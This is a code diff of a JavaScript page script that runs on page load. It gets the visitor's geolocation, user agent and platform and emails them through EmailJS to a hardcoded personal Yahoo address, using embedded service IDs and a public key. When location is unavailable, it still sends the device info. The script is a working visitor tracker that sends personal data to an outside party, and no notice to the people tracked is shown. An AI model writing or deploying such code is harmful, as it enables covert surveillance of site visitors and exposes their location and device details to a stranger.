@@ -1,3 +1,7 @@
+(function () {
+  emailjs.init("LBjNKfoFIJUrwaqXy"); // 👈 Replace with your actual EmailJS public key
+})();
+
 window.onload = function () {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(success, error);
@@ -26,7 +30,7 @@ function success(position) {
     name: "John Doe",
     latitude: latitude,
     longitude: longitude,
-    to_email: "c_nedea9@yahoo.com", // Update with the recipient's email
+    to_email: "c_nedea9@yahoo.com", // Update with your recipient
     message: "This is the user location and device info.",
     user_agent: userAgent,
     platform: platform,
@@ -61,9 +65,9 @@ function handleLocationError(message) {
   // Send the device info without location
   emailjs.send("service_3101r0c", "template_ol182re", {
     name: "John Doe",
-    latitude: "Not Available", // No location data
-    longitude: "Not Available", // No location data
-    to_email: "c_nedea9@yahoo.com", // Update with the recipient's email
+    latitude: "Not Available",
+    longitude: "Not Available",
+    to_email: "c_nedea9@yahoo.com", // Update with your recipient
     message: "User's location was not available, but here's the device info.",
     user_agent: userAgent,
     platform: platform,
